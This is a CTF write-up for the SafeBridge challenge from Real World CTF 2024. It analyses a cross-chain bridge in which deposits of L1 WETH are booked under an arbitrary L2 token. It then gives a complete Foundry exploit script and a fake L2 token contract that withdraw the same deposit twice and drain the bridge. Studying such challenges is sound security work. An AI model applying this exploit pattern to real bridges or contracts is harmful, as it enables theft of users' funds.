---
title: (CTF) realworld CTF 2024 writeup (SafeBridge)
categories: [CTF,WEB3]
tags : [writeup,web3]
date : 2024-01-30 17:02:13 +0900
author:
    name:
    link:
toc: true
comments: true
mermaid: true
math: true
---

web3 newbie's solver for SafeBridge in rwctf 2024

## **Objective**

Drain the **`BRIDGE`** (L1ERC20Bridge) of its WETH balance.

## **Setup**

The challenge is set up using the `challenge.py` file, with `relayer.py` also running in the background.

There appear to be two instances each of l1 and l2, with each instance holding 1000 ether.

```python
action? 1
creating private blockchain...
deploying challenge...

your private blockchain has been set up
it will automatically terminate in 1440 seconds
---
rpc endpoints:
    - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l1
    - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l2
private key:        0x89fbaf7272d5f581e07ec0315d3be44906ff75ebfbd953528e3874351d8230a6
challenge contract: 0x723516b4d13F4D5E7Cc4bCd6ccE9f6eb584da5e6

```

The setup is configured as shown above.

### **challenge.py**

Let's start by examining the challenge setup:

1. Deployment is done via the Deploy.s.sol script.
    - 2 ether is approved for L1ERC20Bridge followed by a call to depositERC20.
    - This action transfers WETH to L1ERC20Bridge and triggers a message to call L2ERC20Bridge.finalizeDeposit. More on this later.
2. A precompiled contract is deployed:

```solidity
library Lib_PredeployAddresses {
    address internal constant L2_CROSS_DOMAIN_MESSENGER = 0x420000000000000000000000000000000000CAFe;
    address internal constant L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe;
    address internal constant L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);
}

```

Next, we'll delve into the token transfer method by examining the `relayer.py` file.

### **relayer.py**

```python
Thread(
    target=self._relayer_worker, args=(l1, l1_messenger, l2_messenger)
).start()
Thread(
    target=self._relayer_worker, args=(l2, l2_messenger, l1_messenger)
).start()

```

Workers operate on l1_messenger and l2_messenger respectively.

```python
def _relayer_worker(
    self, src_web3: Web3, src_messenger: Contract, dst_messenger: Contract
):
    _src_chain_id = src_web3.eth.chain_id
    _last_processed_block_number = 0

    while True:
        try:
            latest_block_number = src_web3.eth.block_number
            if _last_processed_block_number > latest_block_number:
                _last_processed_block_number = latest_block_number

            print(
                f"chain {_src_chain_id} syncing {_last_processed_block_number + 1} {latest_block_number}"
            )
            for i in range(
                _last_processed_block_number + 1, latest_block_number + 1
            ):
                _last_processed_block_number = i
                logs = src_messenger.events.SentMessage().get_logs(
                    fromBlock=i, toBlock=i
                )
                for log in logs:
                    print(f"chain {_src_chain_id} got log {src_web3.to_json(log)}")
                    try:
                        tx_hash = dst_messenger.functions.relayMessage(
                            log.args["target"],
                            log.args["sender"],
                            log.args["message"],
                            log.args["messageNonce"],
                        ).transact()

                        dst_messenger.w3.eth.wait_for_transaction_receipt(tx_hash)
                        print(
                            f"chain {_src_chain_id} relay message hash: {tx_hash.hex()} src block number: {i}"
                        )
                        time.sleep(1)
                    except Exception as e:
                        print(e)
        except:
            traceback.print_exc()
            pass
        finally:
            time.sleep(1)
```

The worker checks src events every second and then calls relayMessage on the destination.

## **Analysis**

### **L1→L2 Token Deposit**

1. **WETH Deposit & Approval**
2. **Calling L1Bridge::depositERC20(weth,l2_weth,amount)**
    - Transfers tokens from msg.sender to the bridge.
    - If l1token == weth, it triggers **`L2bridge:finalizeDeposit(0,l2_weth,from,to,amount)`**.
    - Otherwise, it triggers **`L2bridge:finalizeDeposit(l1token,l2token,from,to,amount)`**.
    - This sends a message to L2TokenBridge and updates **`deposits[l1token][l2token]`**.
    - A problem arises when l1token→weth and l2token→other token.
    - The deposit on L2 is made to L2_WETH, but the record in deposits is to the address of the other token.
3. **Relayer Acceptance**
    - Checks L1 events and calls relayMessage on L2.
    - Hashes the calldata, sets xDomainMessageSender → msg.sender, and then calls.
    - In finalizeDeposit, checks if it is L1TokenBridge and then mints L2token.

### **L2→L1 Token Withdrawal**

1. **Burn L2token**
2. **Encode Message**
    - If L2Token==L2_WETH, it triggers **`L1Bridge::finalizeWethWithdrawal(from,to,amount)`**.
    - Otherwise, it triggers **`L1Bridge::finalizeERC20Withdrawal(L1token,L2token,from,to,amount)`**.
3. **Relayer Acceptance**
    - Checks L2 events and calls relayMessage on L1.
    - **`finalizeERC20Withdrawal`** reduces **`deposits[l1token][l2token]`**.
    - Executes **`IERC20(L1Token).safeTransfer(to,amount)`**.

### **Current Balance Situation**

```markdown
# L1_weth
L1Bridge: 2 ether

# deposits
L1_weth → L2_weth: 2 ether

# L2_weth
L2Bridge: 2 ether
```

### **Potential Race Condition?**

Race conditions seem unlikely, but could they be a factor? The worker checks for events in the block, waits 1 second per event, and remains pending until the transaction finalizes. Could disrupting the sync create a race condition?

- The sendMessage function allows arbitrary calls (msg.sender = crossDomainMessenger), but finalizeERC20Withdrawal and deposits aren't possible.
- What about using a fakeL1/L2 token? This could extend beyond just the L1weth ↔ L2weth pair to include L1weth ↔ L2fake.

```solidity
(bool success,) = _target.call(_message);
```

Can we interact with the token using this part of relayMessage (msg.sender = relayer)? It seems unrelated to tokens.

## **Root Cause**

```solidity
function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    internal
{
    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

    bytes memory message;
    if (_l1Token == weth) {
        message = abi.encodeWithSelector(
            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
        );
    } else {
        message =
            abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
    }

    sendCrossDomainMessage(l2TokenBridge, message);
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
}
```

The **`_initateERC20Deposit`** function behaves in a specific way:

- Regardless of the L2 token, if the L1 token is weth, the event message sent to L2 will make the deposit to L2:WETH. However, a different L2 token can be recorded in the deposits mapping storage.
- Deploying a fakeL2 token on L2 and giving the user enough of that token allows for manipulation

## **Exploit**

1. **[L2]** Create a fake L2 token.
2. **[L1]** Send L1_weth → L2_fake (effectively sending L1_weth → L2_weth).
3. **[L2]** Withdraw L2_weth → L1_weth (2 ether).
4. **[L2]** Withdraw L2_fake → L1_weth (2 ether).

```solidity
pragma solidity ^0.8.20;

import {Script,console2} from "forge-std/Script.sol";

import "src/L1/WETH.sol";
import "src/L1/L1CrossDomainMessenger.sol";
import "src/L1/L1ERC20Bridge.sol";
import "src/Challenge.sol";
import "src/L2/standards/L2StandardERC20.sol";
import "src/L2/L2ERC20Bridge.sol";
import {Lib_PredeployAddresses} from "src/libraries/constants/Lib_PredeployAddresses.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "src/L2/standards/IL2StandardERC20.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Solve is Script {
    L2Fake fake;
    Challenge challenge;
    L1ERC20Bridge l1Bridge;
    WETH weth;
    function setUp() public {}

    function get_info() public {
        console2.log("msg.sender", msg.sender);
        vm.startBroadcast();
        challenge = Challenge(vm.envAddress("CHALLENGE"));
        l1Bridge = L1ERC20Bridge(challenge.BRIDGE());
        weth = WETH(payable(address(challenge.WETH())));
        console2.log("challenge", address(challenge));
        console2.log("l1Bridge", address(l1Bridge));
        console2.log("weth", address(weth));
    }
    function create_fake() public {
        vm.startBroadcast();
        weth = WETH(payable(address(vm.envAddress("WETH"))));
        console2.log("weth",address(weth));
        fake = new L2Fake(address(weth),"fake","fake");
        console2.log("fake",address(fake));
        vm.stopBroadcast();
    }
    function run_send_to_fake() public {
        vm.startBroadcast();
        weth = WETH(payable(address(vm.envAddress("WETH"))));
        l1Bridge = L1ERC20Bridge(vm.envAddress("L1_BRIDGE"));
        fake = L2Fake(vm.envAddress("FAKE"));
        console2.log("address(weth)",address(weth));
        console2.log("address(l1Bridge)",address(l1Bridge));
        console2.log("address(fake)",address(fake));
        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), address(fake), 2 ether);
        console2.log("user:weth",weth.balanceOf(address(l1Bridge)));
    }
    function run_withdraw() public {
        vm.startBroadcast();
        fake = L2Fake(vm.envAddress("FAKE"));
        console2.log("address(fake)",address(fake));
        L2ERC20Bridge l2Bridge = L2ERC20Bridge(Lib_PredeployAddresses.L2_ERC20_BRIDGE);
        console2.log("address(l2Bridge)",address(l2Bridge));
        l2Bridge.withdraw(Lib_PredeployAddresses.L2_WETH, 2 ether);
        console2.log("address(l2Bridge)",address(l2Bridge));
        console2.log("address(l2Bridge)",address(l2Bridge.l1TokenBridge()));
        l2Bridge.withdraw(address(fake), 2 ether);
        console2.log("address(l2Bridge)",address(l2Bridge));
    }
}

contract L2Fake is IL2StandardERC20, ERC20 {
    address public l1Token;

    constructor(address _l1Token, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        l1Token = _l1Token;
        _mint(msg.sender, 3 ether);
    }

    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {
        bytes4 firstSupportedInterface = bytes4(keccak256("supportsInterface(bytes4)")); // ERC165
        bytes4 secondSupportedInterface =
            IL2StandardERC20.l1Token.selector ^ IL2StandardERC20.mint.selector ^ IL2StandardERC20.burn.selector;
        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);

        emit Mint(_to, _amount);
    }

    function burn(address _from, uint256 _amount) public {
        _burn(_from, _amount);

        emit Burn(_from, _amount);
    }
}
```

### **Challenges and Considerations**

- Not being familiar with Foundry meant executing each function one by one, changing the L2 and L1 rpc accordingly. This prevented variable sharing, requiring the execution of each function individually and updating environment variables as needed.
- Using **`vm.createSelectFork`** could potentially address this issue.
- Deploying an attacker contract seems like a more efficient approach to writing the code.
- The last **`run_withdraw`** function was problematic due to its use of a precompiled address, necessitating direct sending using cast send.